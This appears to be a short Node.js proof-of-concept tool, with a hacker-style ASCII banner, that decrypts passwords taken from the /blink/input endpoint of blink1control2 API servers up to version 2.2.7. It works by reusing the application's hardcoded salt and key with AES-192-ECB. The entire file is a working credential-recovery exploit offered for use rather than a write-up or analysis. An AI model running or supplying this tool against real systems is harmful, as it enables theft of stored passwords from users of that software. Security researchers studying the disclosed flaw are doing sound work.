#!/usr/bin/env node

const banner = ` _     _ _       _    _                                 
| |__ | (_)_ __ | | _/ |      _ __   __ _ ___ ___       
| '_ \\| | | '_ \\| |/ / |_____| '_ \\ / _\` / __/ __|_____ 
| |_\) | | | | | |   <| |_____| |_) | (_| \\__ \\__ \\_____|
|_.__/|_|_|_| |_|_|\\_\\_|     | .__/ \\__,_|___/___/      
                             |_|                        
     _                            _                     
  __| | ___  ___ _ __ _   _ _ __ | |_                   
 / _\` |/ _ \\/ __| '__| | | | '_ \\| __|                  
| (_| |  __/ (__| |  | |_| | |_) | |_                   
 \\__,_|\\___|\\___|_|   \\__, | .__/ \\__|                  
                      |___/|_|`;
 
const { ArgumentParser } = require('argparse')

const parser = new ArgumentParser({ description: 'decrypts passwords'
+ 'found at /blink/input of the blink1control2 <= 2.2.7 api server.' })


parser.add_argument('ciphertext', { help: 'encrypted string.', type: 'str' });

let args = parser.parse_args()

try {
    var simplecrypt = require('simplecrypt');
    var sc = simplecrypt(
        {salt:'boopdeeboop',
        password:'blink1control',
        method:'aes-192-ecb'}
    );
    var ciphertext = args.ciphertext;
    var decrypted = sc.decrypt(ciphertext);
    console.log(banner);
    console.log('[+] password:')
    console.log(decrypted);
}
catch (TypeError) {
    console.log('[!] the submitted hash was invalid.')
}
finally {
    process.exit(1)
}
